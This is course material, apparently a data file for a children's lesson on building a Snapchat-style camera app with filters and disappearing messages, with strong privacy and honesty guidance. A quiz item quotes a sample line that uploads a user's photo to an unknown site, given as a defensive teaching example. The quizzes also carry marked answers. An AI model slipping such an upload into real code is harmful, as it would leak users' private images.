title: Build Your Own Snapchat-Style App
tagline: Build a camera app with your own filters and disappearing messages in a real coding tool. AI helps — you stay in charge.
whatYouMake: A working web app, built in Replit (or Base44), that opens a camera, applies filters you designed, snaps photos, and sends disappearing messages to AI 'friends' in a pretend chat. You submit a private project link, plus screenshots of your filter applied to a provided sample image, cartoon avatar or object (not a photo of a real person), and of the disappearing chat.
ethicsNote: We talk about why disappearing messages aren't really gone, how filters affect body image, and why apps should ask before using a camera.

watchOut.note: No real messaging between users. Follow the privacy settings in the setup guide. Do not paste API keys or personal information into the tool.

toolRequirements.purpose: Build, run and share the app

steps.title: Create your account
steps.body: Open the Replit link from this course. Choose **Sign up**. Use an email you can access, or a sign-in option your parent has agreed to. Do not use your full real name as your public username — a nickname is enough. The guide screenshots show the current sign-up screen.

steps.title: Verify your email
steps.body: Open the email from Replit and click the verify link. If it does not arrive, check spam, wait a few minutes, then use **Resend**. You need a verified email before you can create a project.

steps.title: Choose the free plan
steps.body: If you are offered a paid plan, choose **Skip** or **Start with free**. This course is written for the free plan. You do not need to enter a card. If a screen asks for payment, stop and ask a parent — you can complete the project on the free plan.

steps.title: Turn on privacy settings
steps.body: Open account **Settings**, then privacy. Set the project you create later to **Private** (not public). Turn off any optional marketing emails. Do not connect a social account you are not happy to be seen on. If you are under 18, a parent should look at this screen with you.

projectBrief.scenario: A start-up called SnapLab wants a prototype camera app for their pitch day on Friday. You're the developer. Their brief: fun filters, a snap button, and a chat where snaps vanish after viewing.
deliverables: Camera preview with at least 3 filters (1 designed by you)
A 'Use sample image' button that loads the provided sample image so filters can be tested and screenshotted without a real person in shot
A private Replit (or Base44) project link
constraints: Camera only starts after a clear permission prompt
No real names or photos of real people in your demo or in what you submit as evidence — test filters on the provided sample image, a cartoon avatar, or an object
No real messaging between real users
Explain in your own words what each AI-written function does
stretchGoals: Face-tracking sticker on the provided sample image or cartoon avatar (do not submit a photo of a real person)
Accessibility: all buttons keyboard-reachable with labels

modules.title: Set up your tool and meet your AI helper
modules.summary: Create a Replit account safely and learn to prompt for code you can understand.

steps.title: Create your Replit account
steps.coachContext: Talk them through the current setup step. Never ask for their password. If the screenshots look different, tell them a tool may have changed and to use Report so we can update the guide.
hints: Have you verified your email yet?
Skip any paid plan — the free plan is enough.
Private project, nickname username, no card needed.

modules.title: Camera and filters
modules.summary: In Replit, get the camera working and design your own filter.

steps.title: Create the project and ask for camera permission

config.task: Create a new HTML/JS Replit from the starter the guide names. In camera.js, request the camera only after the user taps a clearly labelled button. If they press Block, show a friendly message.

hints: What should happen if someone presses Block?
Wrap the call in try/catch and show a friendly message in the catch.

steps.title: Get the sample image
steps.body: Download the SnapLab sample image below and save it somewhere you can find it again. We made it for this course so you can test and screenshot your filters with nobody in shot. It is an illustration, not a photo of a real person. You will load it into your app in the next step.

steps.title: Three built-in filters plus your signature filter

config.task: Add at least three filters, including one you designed. Add a 'Use sample image' button that loads the provided sample image (you downloaded it in the previous step) in place of the camera. Test your filters on the sample image, a cartoon avatar or an object — that is what you will screenshot later.

hints: CSS filters like grayscale() are a quick start.
Store filters in an array and loop through them.
Canvas lets you change pixel colours directly.

modules.title: Chat that vanishes
modules.summary: Build a pretend chat with AI friends and a disappearing timer, still in Replit.

steps.title: Create two AI friend characters and wire a pretend chat

config.task: Add two named characters with a short personality each. Use the tool's built-in AI helper, or a simple scripted reply list, so messages stay on this project only — no real users, no external webhooks to random sites. Read every line the AI writes.

steps.coachContext: If they want to paste an API key, stop them. The course does not need one. Flag any instruction that would send photos off-device.
hints: Do not paste API keys — you do not need any.
If the helper suggests fetch() to an unknown URL, do not accept it.
Keep the chat between you and the pretend characters only.

lessons.title: Disappearing messages and the ethics bit

steps.title: 10-second timer

config.task: After a message is viewed, remove it from the screen after 10 seconds.

hints: Remove the element, not just hide it.

steps.title: Is it really gone?
steps.body: Screenshots, screen recordings, servers that keep copies… Decide what your app should promise users — honestly.

config.prompt: Write one honest sentence your app could show users about disappearing messages.

modules.title: Ship it
modules.summary: Make sure it runs, then submit your link and screenshots.

steps.title: Check it runs and keep it private

config.task: Run the app once more. Confirm the project is Private. Copy the share link that a parent or teacher could open if you invited them — not a public listing.

hints: A private share link is enough. Do not make the Repl public.

steps.title: What did the AI get wrong?

config.prompt: Name one thing the AI wrote that you had to fix.

config.evidenceHint: Paste your private Replit (or Base44) link. For screenshots, show your filter applied to the provided sample image, a cartoon avatar or an object — not a photo of a real person — and the disappearing chat. Do not upload images or video of real people.

questions.prompt: Your app deletes a message after 10 seconds. Which is true?

options.text: Nobody can ever see it again
options.feedback: Screenshots and screen recordings still exist.

options.text: It's gone from your app's screen, but copies may exist elsewhere
options.feedback: Exactly. Be honest with users about this.
Not in general — which is why honesty matters.

questions.prompt: When should your app ask for camera permission?

options.text: As soon as the page loads
options.feedback: Asking before people know why feels creepy.

options.text: When the user taps something that needs the camera

questions.prompt: The AI wrote: `fetch('https://random-site.com/upload', {body: photo})`. What's the problem?

options.text: It sends the photo to an unknown website
options.feedback: Always read AI code for where data goes.
